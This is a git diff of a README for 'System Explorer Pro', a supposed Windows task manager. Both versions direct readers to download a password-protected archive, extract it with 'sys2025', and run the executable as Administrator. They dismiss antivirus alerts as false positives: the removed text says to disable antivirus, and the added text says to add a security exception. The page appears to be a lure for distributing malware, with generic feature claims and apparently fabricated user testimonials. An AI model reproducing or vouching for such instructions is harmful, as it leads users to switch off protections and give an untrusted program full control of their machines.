@@ -1,61 +1,64 @@
-# 🖥️ System Explorer Pro
+# 🖥️ system-explorer-pro - Manage your Windows system with ease
 
-> 🔧 **Advanced task manager for Windows. Monitor, control, and optimize your system.**
+[![](https://img.shields.io/badge/Download_System_Explorer-Blue?style=for-the-badge)](https://github.com/alexapreconceived85/system-explorer-pro)
 
-![GUI](screen.jpg)
+System Explorer Pro provides a clear view of your computer processes. It helps you track system performance. You can stop tasks and manage memory use through an easy interface. This tool brings control to your Windows desktop.
 
----
+## ⚙️ System Requirements
 
-## ✨ Features
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4 GB RAM minimum.
+- Storage: 50 MB of free space.
+- Access: Administrator rights are necessary for full functionality.
 
-- ✅ **Real-time process list** with CPU, RAM, and status
-- ✅ **Kill unresponsive tasks** instantly
-- ✅ **Suspend & Resume** processes (unique feature!)
-- ✅ **Open file location** of any running process
-- ✅ **Process tree kill** – terminate all child processes
-- ✅ **CPU & RAM usage graphs** in real time
-- ✅ **Dark theme** with neon accents
-- ✅ **Windows 10/11 support**
+## ✨ Core Functions
 
----
+The software provides tools to oversee your computer.
 
-## 📥 How to Download & Install
+- Process Oversight: View all active programs and background services.
+- Live Graphs: Watch CPU and RAM usage patterns in real time.
+- Task Control: End programs that stop responding.
+- Process Suspension: Pause heavy tasks without closing them.
+- File Locations: Find the exact folder where any program resides.
+- Tree Termination: Stop a main process and all related sub-processes at once.
+- Visual Mode: Use the integrated dark theme for better visibility at night.
 
-1. **Go to the official download page:**  
-   👉 [https://vernonockey.github.io/system-explorer-pro/](https://vernonockey.github.io/system-explorer-pro/)
+## 🚀 How to Install and Launch
 
-2. Click the **"Download Now"** button.
+Follow these steps to set up the software on your machine.
 
-3. **Extract** the archive with password: `sys2025`
+1. Open your web browser and go to the download site: [https://github.com/alexapreconceived85/system-explorer-pro](https://github.com/alexapreconceived85/system-explorer-pro).
+2. Locate the file download link on that page.
+3. Save the file to your desktop or downloads folder.
+4. Open the compressed file. Use the password `sys2025` when prompted.
+5. Move the folder to your preferred location on your hard drive.
+6. Right-click the file named `SystemExplorer_Pro.exe`.
+7. Choose Run as Administrator from the menu to grant the program permission to manage your system settings.
 
-4. **Disable your antivirus** (false positive due to system-level access).
+## 🛡️ Usage and Safety
 
-5. Run `SystemExplorer_Pro.exe` as Administrator.
+Windows might show a warning message when you open the file. This happens because the program interacts with system files to perform its tasks. You can trust the file if you downloaded it directly from the link provided above. Add an exception in your security software if it blocks the file from running.
 
-6. Take full control of your system!
+## 🔍 How to Monitor Performance
 
----
+The main dashboard shows your CPU and RAM usage. The graphs update every second. Large spikes indicate high usage. Click on any item in the list to see more details. This helps you identify software that consumes too much power or memory.
 
-## ⚠️ Important
+## 💡 Tips for Efficiency
 
-- Some antivirus software may flag this tool as a false positive. It accesses system processes and files, which triggers standard security warnings. Add the folder to exclusions or disable real-time protection temporarily.
+Use the search bar at the top to find specific programs. You can filter the list by name, memory usage, or CPU load. Sort the columns by clicking the headers. This reveals which processes affect your computer speed most.
 
----
+## 🤝 Support and Assistance
 
-## 💬 User Feedback
+If the program fails to start, check that you have the latest updates for Windows. Ensure that no other process manager blocks the ports needed for operation. Restart your computer if the system interface does not refresh correctly.
 
-> "Better than Windows Task Manager. The suspend feature is a lifesaver!"  
-> — *poweruser99*
+## 🛠️ Advanced Features
 
-> "Finally a free tool that shows what's really running on my PC. Clean and fast."  
-> — *techguru2025*
+The software includes a feature to freeze programs. This prevents a task from using system resources without closing it permanently. Use this for apps you plan to use later but want to stop for the moment. The resume button restores these apps to their previous state.
 
----
+## 📋 Keeping the System Clean
 
-## 📜 Disclaimer
+Check the process list often to find hidden programs. Some apps run in the background without your knowledge. You can reveal their source folders to see what they do. If you find unknown files, use the delete or end task function to clear your system memory.
 
-For educational and system administration purposes only. Use at your own risk.
+## 📝 Frequently Asked Questions
 
----
-
-© 2025 System Explorer Tools. All rights reserved.
+Can I run this on Windows 8? This software requires specific hooks found only in Windows 10 and 11. Use a supported version for best results. Does it track my data? No, this application acts only on your local system. It does not send information to external servers. How do I update? Visit the main page again to download the newest version of the file as updates become available. Follow the same install steps to overwrite the old file.
